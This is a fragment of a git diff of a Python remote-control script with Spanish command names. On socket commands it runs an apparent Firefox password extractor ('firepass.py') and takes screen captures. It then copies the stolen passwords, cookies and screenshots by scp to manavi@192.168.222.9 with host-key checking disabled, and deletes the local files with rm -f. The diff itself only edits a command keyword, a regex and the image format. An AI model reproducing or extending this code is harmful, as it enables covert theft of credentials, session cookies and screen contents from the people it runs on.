@@ -47,7 +47,7 @@ while True:
 		os.system('rm -f /tmp/cookies.txt')
 		connstream.send("Archivo enviado")
 
-	elif recibido == "contra":
+	elif recibido == "contrasenas":
 		os.system("python firepass.py")
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas 1>/dev/null')
 		os.system('rm -f /tmp/firepass.txt')
@@ -61,10 +61,10 @@ while True:
 		connstream.send("Archivo enviado")
     
 	elif re.search('captura',recibido):
-		mo = re.match('captura ([tn]{1,1}) (\d+)',recibido);
+		mo = re.match('captura (\-[tn]{1,1}) (\d+)',recibido);
 		captura.tiempo(mo.group(1),mo.group(2))
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.jpg manavi@192.168.222.9:~/capturas 1>/dev/null')
-		os.system('rm -f /tmp/*.jpg')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.png manavi@192.168.222.9:~/capturas/ 1>/dev/null')
+		os.system('rm -f /tmp/*.png')
 		connstream.send("Archivo enviado")
  
 	elif re.search('captvid',recibido):
